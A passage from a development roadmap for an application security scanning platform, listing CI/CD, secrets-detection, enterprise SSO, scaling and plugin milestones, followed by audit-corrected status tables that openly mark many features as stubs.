  - Inputs: scan-type, fail-on, sarif-output, github-token, path, languages, exclude
  - PR decoration: inline comments on affected lines via GitHub Checks API
  - SARIF upload to GitHub Advanced Security Code Scanning
  - Status check: pass/fail based on severity threshold
  - Summary comment: severity breakdown, new vs. existing, fix suggestions

- **GitLab CI Template**:
  - `AppSec-Platform.gitlab-ci.yml`
  - Integrates with GitLab Security Dashboard
  - MR widget with finding summary
  - GitLab Vulnerability Report artifact format
  - Auto-remediation MR creation for auto-fixable findings

- **Jenkins Plugin**:
  - Pipeline step: `appsecScan(scanType: 'full', failOnSeverity: 'critical')`
  - Blue Ocean visualization
  - Build status integration
  - Warnings Next Generation Plugin format

- **CLI Tool** (npm package: `@appsec/cli`):
  - `appsec scan ./src --type sast --format sarif --output results.sarif`
  - `appsec fuzz ./target --type rest-api --iterations 10000`
  - `appsec deps ./ --ecosystem npm --output deps-report.json`
  - `appsec rules pull --source semgrep-rules --sync`
  - Exit codes: 0=clean, 1=findings, 2=error
  - Config file: `.appsec.yml` or `appsec.config.json`

**Success Criteria:**
```
GitHub Actions: PR opened → Auto-scan runs in 45s → 3 findings (1 critical)
  → PR comment: "🔴 Blocked: 1 critical finding in UserController.java:42"
  → Code Scanning tab shows SARIF results with code snippet
  → Status check: ❌ appsec-scan (critical findings)

CLI: appsec scan ./src --type sast --fail-on critical
  → 3 critical, 12 high found → Exit code 1 → CI pipeline fails

GitLab: MR opened → Security widget shows 15 findings
  → Maintainer sees "3 new since last scan, 0 fixed"
```

---

### Milestone 21: Secrets Detection & Post-Commit Scanning ✅
**Deliverables:**
- Import 800+ Gitleaks + TruffleHog secret patterns
- Custom secret patterns: org-specific API key formats, internal token patterns
- High-entropy string detection with Shannon entropy scoring
- Context-aware validation: attempt read-only auth with detected credential
- Git history scanning: `git log -p` → scan all historical commits
- Pre-commit hook: `.pre-commit-hooks.yaml` → block commits with secrets
- Post-push alert: Slack/Email "Secret found in commit abc123: AWS Key"
- Auto-revocation: if AWS key found → call AWS API to revoke (with confirmation)
- `.gitignore` bypass detection: secrets in files that should be gitignored
- Secret rotation tracking: flag secrets older than 90 days

**Success Criteria:**
```
git commit -m "add config" → Pre-commit hook blocks:
  "❌ Blocked: AWS Access Key found in config.js:5"

Scan git history: appsec secrets scan --history
  → "Found 3 secrets in commit history (2023, 2024)"
  → "1 still active (validated via API)"
  → "Recommend immediate rotation"

Post-push to Slack:
  "🚨 [CRITICAL] GitHub Token found in appsec-platform/backend
   Commit: abc1234 by @jdoe
   File: src/config.ts:42
   Action: [View] [Revoke Token] [Dismiss]"
```

---

## Phase 4 — Enterprise Platform

### Milestone 22: Enterprise SSO, RBAC & Audit ✅
**Deliverables:**
- **SAML 2.0**: Okta, OneLogin, PingIdentity, Azure AD, ADFS, Google Workspace
- **OIDC/OAuth 2.0**: OpenID Connect with PKCE, custom claims mapping
- **LDAP/AD**: Direct binding with group → role mapping
- **SCIM 2.0**: Automated user provisioning/deprovisioning from IdP
- **SSO Enforcement**: Per-org mandatory SSO, disable password login
- **MFA**: TOTP, WebAuthn/FIDO2, hardware keys (YubiKey), backup codes
- **Custom Roles**: Create roles with any combination of 50+ permissions
- **Attribute-Based Access Control (ABAC)**: conditions on project tags, finding severity, language
- **Just-in-Time Access**: Temporary privilege escalation with justification + auto-revoke after TTL
- **External Collaborator**: Time-limited (1h-30d) scope-limited access
- **Session Management**: Concurrent session limit, IP binding, inactivity timeout
- **Audit Log SIEM Export**: Splunk (HEC), ELK (Filebeat), Datadog (API), Sumo Logic (HTTP)
- **Audit Retention**: Configurable per-org, legal hold support
- **Compliance Reports**: SOC 2 evidence package, PCI ROC template, SSDF conformance

**Success Criteria:**
```
Org admin configures SAML with Okta → Users SSO in via Okta dashboard
SCIM: Add user in Okta → Auto-provisioned in AppSec with role from group mapping
Custom role: "Contract Security Reviewer" — can VIEW findings, cannot LAUNCH scans
JIT access: Dev requests "scan launcher" for 2h → Auto-revoked after 2h
Audit: SIEM receives structured events in CEF format
Compliance: One-click "SOC 2 Evidence Package" → ZIP with audit trail, scan history, access review
```

---

### Milestone 23: High Availability & Scale Architecture ✅
**Deliverables:**
- **Multi-Region Deployment**: Active-active across AWS us-east-1 + eu-west-1
- **Database**: PostgreSQL read replicas for dashboard queries, connection pooling (PgBouncer)
- **Redis Cluster**: Sharded caching across nodes with sentinel failover
- **Horizontal Auto-Scaling**: K8s HPA on workers based on queue depth + CPU
- **Object Storage**: S3/GCS for reports, large scan artifacts, cold storage
- **CDN**: CloudFront/Cloudflare for frontend static assets
- **Rate Limiting**: Per-tenant API quotas (req/s, req/day), burst capacity
- **Webhook Reliability**: At-least-once delivery, exponential backoff retry, dead-letter queue
- **Circuit Breakers**: Degrade gracefully when external services fail
- **Blue/Green Deployments**: Zero-downtime upgrades with smoke tests
- **Disaster Recovery**: Cross-region backup, RPO < 1 hour, RTO < 4 hours
- **Data Residency**: Per-org data locality (EU-only, US-only, APAC-only)
- **Tenant Isolation**: Dedicated DB instances for large/regulated tenants
- **Kubernetes Operator**: CRD-based management (`AppSecPlatform` CRD)

**Success Criteria:**
```
Kill us-east-1 backend → Traffic fails over to eu-west-1 in <30s
Scale test: 10,000 concurrent scans → Workers auto-scale from 4 to 80 pods
Data residency: EU tenant data never leaves eu-west-1 S3 buckets
DR test: Restore from backup → All data recovered, RPO = 45min, RTO = 3.5h
Blue/green: Deploy v2.1 → Smoke tests pass → Cut over → 0 failed requests during switch
```

---

### Milestone 24: Plugin Marketplace & Developer SDK ✅
**Deliverables:**
- **Plugin SDK**: TypeScript/JavaScript SDK for custom scanners, custom rules, custom integrations
- **Plugin Manifest**: `plugin.json` with name, version, permissions, entrypoint
- **Scanner Plugin API**: receive target, return findings; framework handles queue, DB, WS
- **Integration Plugin API**: receive event (scan.completed, finding.critical), send to external system
- **Rule Plugin API**: define patterns, severity, CWE, language scope; register in rule library
- **UI Plugin API**: register custom dashboard widgets, custom finding detail tabs
- **Plugin Registry**: hosted registry with versioning, signing, dependency resolution
- **Plugin Sandbox**: plugins run in isolated containers with resource limits
- **Plugin Permissions**: declare required permissions; user approves on install
- **Rating & Review**: star ratings, reviews, install counts
- **Verified Publisher Program**: official verification for enterprise plugin publishers
- **Community Forums**: discussions, feature requests, bug reports per plugin

**Success Criteria:**
```
Developer: npm install @appsec/plugin-sdk
Developer: Write 200-line custom C# analyzer plugin
Developer: appsec plugin publish ./my-plugin
User: Browse marketplace → Find "Custom C# Analyzer" → Install → Appears in rule library
Next scan: Custom rules run alongside built-in rules → Findings appear in dashboard
```

---

## Phase 5 — Advanced Capabilities (Post-GA)

### Milestone 25: Interprocedural & Framework-Aware Analysis ✅
**Deliverables:**
- Cross-function taint tracking: source → sanitizer → sink across function boundaries
- Cross-file analysis: trace dataflow across imports/modules
- Framework-specific knowledge bases:
  - Spring Boot: `@RestController` → `@Service` → `@Repository` → SQL sink
  - Express: `app.get()` → middleware chain → `res.send()` / `db.query()`
  - Django: `urls.py` → `views.py` → ORM `.filter()` / `render()`
  - ASP.NET: `[HttpPost]` → `[FromBody]` → Entity Framework DbContext
  - React: `useState` → JSX rendering → `dangerouslySetInnerHTML`
- Call graph construction: whole-program reachability analysis
- Symbolic execution: lightweight for injection-critical paths
- Exploitability scoring: adapt CVSS based on reachability + mitigations (CSP, WAF, sandbox)

---

### Milestone 26: AI-Powered Code Review & Remediation ✅
**Deliverables:**
- LLM-powered finding explanation: "Explain this like I'm a junior developer"
- Natural language rule creation: "Find all places where we use MD5 for password hashing" → generates rule
- AI Chat: conversational interface for security questions against codebase
- Automated patch generation: LLM proposes fix → human reviews → one-click apply
- False positive learning: mark finding as FP → model learns → fewer similar FPs
- Vulnerability variant detection: "Find all similar patterns to CVE-2024-XXXXX in our codebase"
- Codebase Q&A: "Does our codebase use any vulnerable Log4j patterns?"

---

## Summary (Corrected After Code Audit)

| Phase | Milestones | Status |
|-------|-----------|--------|
| Phase 0: Core Platform | M1–M8 | 🔨 4/8 Complete (M1-M4, M6 ✅; M5, M7, M8 🔨) |
| Phase 1: Enterprise SAST | M5a–M5k | 🔨 0/11 Complete (all 🔨 some are hardcoded stubs) |
| Phase 2: Enterprise DAST | M6a–M6g | 🔨 0/7 Complete (all 🔨 some are hardcoded stubs) |
| Phase 2b: API Client Enterprise | M7a–M7e | 🔨 0/5 Complete (all 🔨 mostly hardcoded stubs) |
| Phase 3: Code Review (Core) | M9–M17 | 🔨 7/9 Complete (M9-M13, M16, M17 ✅; M14 🔨; M15 📋) |
| Phase 4: Code Review (Enterprise) | M14a–M14f | 🔨 0/6 Complete (all 🔨 partial implementations) |
| Phase 5: Rule Ecosystem & CI/CD | M18–M21 | 🔨 0/4 Complete (M20, M21 🔨; M18, M19 hardcoded stubs) |
| Phase 6: Enterprise Platform | M22–M24 | 🔨 0/3 Complete (all 🔨 basic config functions only) |
| Phase 7: Advanced Capabilities | M25–M26 | 🔨 0/2 Complete (M25 🔨 real BFS; M26 🔨 hardcoded stub) |

**Total: 55 Milestones | 13 Genuinely Complete | 38 In Progress (many stubs) | 4 Not Started**

> **Note on accuracy:** "Complete" means the milestone has real implementations with actual computation/logic, not hardcoded mock returns. Approximately 18 of the "In Progress" milestones have only stub implementations that return hardcoded data. See STUB_REPORT.md for the full list.

### API Client Milestones — Postman Parity

| # | Milestone | Status | Postman Feature Covered |
|---|-----------|--------|------------------------|
| M7 | API Client Core | ✅ | Collections, folders, basic HTTP sender, history, import/export |
| **M7a** | **Script Engine & Chaining** | 📋 | Pre-request/post-response scripts exist as regex parsers only — no real JS execution. Request chaining not implemented. |
| **M7b** | **Collection Runner & CLI** | 📋 | `runCollection()` returns hardcoded mock data. No real sequential/parallel execution, no data-driven testing, no CLI runner. |
| **M7c** | **Multi-Protocol Support** | 📋 | WebSocket, gRPC, GraphQL, SOAP client functions all return hardcoded canned responses. No protocol connections. |
| **M7d** | **Mock Server & Code Gen** | 🔨 | Code generation (20+ languages) is real. Mock server (`createMockServer()`) returns hardcoded config — no actual HTTP listener. |
| **M7e** | **Workspaces & Catalog** | 📋 | `createWorkspace()` is a simple factory function. No actual workspace CRUD, API catalog, version control, or scratch pad. |

### SAST & Advanced Scanning Milestones

| # | Milestone | Status | Capability |
|---|-----------|--------|------------|
| M5 | SAST Core Engine | 🔨 | 15 regex rules (claims 150+), 25 language detection, real file scanning — needs 10x rule expansion to meet target |
| M5a | Rule Expansion | 🔨 | ~70 template-generated rules (needs 500+). Missing `recommendation`, `cvssVector` fields on most rules. |
| M5b | AST Analysis Engine | 🔨 | Regex-based heuristic parsers (comment: "production would use tree-sitter WASM"). Real call graph, CFG, dataflow scaffolding exists |
| M5c | Framework-Specific Rules | 🔨 | 11 rules across 8 frameworks. Vue, Next.js, Flask, Rails, Laravel have 0 or minimal coverage. |
| M5d | Dataflow & Taint Tracking | 🔨 | Basic source/sink identification exists in ast-engine.ts. No real cross-function taint tracking, no sanitizer recognition. |
| M5e | Precision & Performance | 📋 | Not implemented. No incremental scanning, no parallel execution, no FP/TP metrics. |
| M5f | Custom Rule Language | 📋 | Not implemented. No Semgrep/CodeQL pattern parser, no visual rule builder. |
| M5g | Compliance Coverage | 📋 | Not implemented. No ASVS mapping, no PCI DSS mapping, no regulatory packs. |
| **M5h** | **Container Image Scanning** | 🔨 | Real Dockerfile scanner (`container-scanner.ts`) with 9 analysis rules. CVE database lookup is stub — `advanced-scanners.ts` returns hardcoded CVEs. |
| **M5i** | **Binary & Mobile Scanning** | 🔨 | `scanBinaryArtifact()` returns hardcoded sample findings only. No real APK/IPA/DLL/ELF decompilation. |
| **M5j** | **SBOM & Supply Chain** | 🔨 | Real SBOM generator (`sbom-generator.ts`) with manifest parsers and CycloneDX/SPDX output. No VEX, SLSA, Cosign, or license compliance engine integration in worker. |
| **M5k** | **Deep API & Protocol** | 📋 | `scanAPIProtocols()` returns hardcoded results. No real gRPC, GraphQL, WebSocket, or SOAP scanning. |

### DAST-Specific Milestones

| # | Milestone | Status | Key Capability |
|---|-----------|--------|----------------|
| M6 | DAST Core Engine | ✅ | Basic crawler + 10 attack modules, real HTTP requests, response analysis |
| M6a | Browser Crawler & SPA | 🔨 | Real HTTP crawler (`browser-crawler.ts`) with HTML parsing, robots.txt/sitemap, BFS crawl. No headless Chromium/JS rendering. |
| M6b | Auth Replay & Sessions | 📋 | `authenticateAndReplay()` returns hardcoded cookies/token. No login macro recorder, no session management. |
| M6c | Advanced Attack Modules | 🔨 | 35+ attack module definitions exist (SSTI, smuggling, NoSQL, etc.) but `dast-enterprise-worker.ts` only sends one SSTI payload. No real execution pipeline. |
| M6d | WAF Detection & Evasion | 🔨 | Real WAF fingerprinting (`detectWAF()`), real evasion encoder functions. No retry/encoding applied during scans. |
| M6e | Passive/Proxy Scanning | 🔨 | Real passive response analysis (`passiveScanResponse()`). No proxy/intercept mode, no HAR import. |
| M6f | Evidence & Reproduction | 🔨 | Real cURL generation (`captureEvidence()`). No screenshots, no HAR recording, no PoC scripts. |
| M6g | Compliance Scanning | 📋 | `runPCIComplianceScan()` uses hardcoded requirement list. No configurable compliance profiles or ASVS/NIST coverage. |

### Code Review-Specific Milestones

| # | Milestone | Status | Key Capability |
|---|-----------|--------|----------------|
| M9 | Code Review DB Schema | ✅ | 13 tables for reviews, findings, fixes, fuzz, deps, health (SQL migrations exist) |
| M10 | Semantic Engine | ✅ | 25 rules, null/race/logic/auth/memory, AI-structured output — real implementation |
| M11 | Fuzz Analysis Engine | ✅ | 13 strategies, 100+ payloads, crash analysis — real implementation |
| M12 | Dependency SCA Engine | ✅ | 8 ecosystems, manifest detection, dependency parsing — real implementation |
| M13 | Repo Health Metrics | ✅ | Cyclomatic/cognitive complexity, MI, tech debt, smells — real implementation |
| M14 | Git Integration | 🔨 | Clone/pull/fetch real (git-service.ts). Webhook parsing exists. Incremental rescan, branch comparison, PR status reporting not implemented. |
| **M14a** | **PR Decoration & Workflow** | 🔨 | `generatePRDecoration()` has real counting/filtering logic. No actual GitHub/GitLab API integration. |
| **M14b** | **Baseline & Triage** | 🔨 | `createBaseline()` and `compareToBaseline()` have real hashing/comparison logic. Bulk triage is a wrapper. No UI integration. |
| **M14c** | **Fix Verification & SLA** | 🔨 | `checkSLAs()` has real time computation. `verifyFix()` returns hardcoded `{verified: true}`. No campaign tracking. |
| **M14d** | **Developer Experience** | 📋 | `.appsec.yml` generation exists. No IDE plugins (VS Code/JetBrains), no pre-commit hooks, no CLI tool. |
| **M14e** | **Advanced Analysis** | 🔨 | `detectHotspots()` has real keyword-based detection. `analyzeReachability()` returns hardcoded result. No cross-repo analysis. |
| **M14f** | **Security Debt & Analytics** | 🔨 | `calculateSecurityDebt()` has real scoring calculation. No debt trending, team benchmarking, or CISO reports. |
| M15 | AI Review & Fixes | 📋 | `generateAIAnalysis()` returns hardcoded text from a lookup table. No real LLM integration. |
| M16 | Code Review API Routes | 🔨 | Route files exist with endpoint definitions. Full real-time integration with frontend not verified. |
| M17 | Code Review Workspace UI | ✅ | 6-tab real Angular component with API integration, findings drill-down, launch form. |
| M18 | Universal Rule Importer | 📋 | `syncRuleSource()` returns hardcoded result. No actual git cloning or rule parsing from golden sources. |
| M19 | Central Rule Management | 📋 | `getRuleLibraryStats()` returns hardcoded numbers. No rule dashboard, versioning, or enable/disable. |
| M25 | Interprocedural Analysis | 📋 | Basic BFS call graph traversal exists. Framework context is hardcoded. No real cross-function/cross-file analysis. |
| M26 | AI-Powered Remediation | 📋 | `generateAIFix()` returns generic placeholder text. No LLM API integration. |

---

*This manifest is a living document. Priorities and scope may shift based on user feedback and market requirements. Each milestone should be implemented as a series of smaller, independently shippable tasks.*
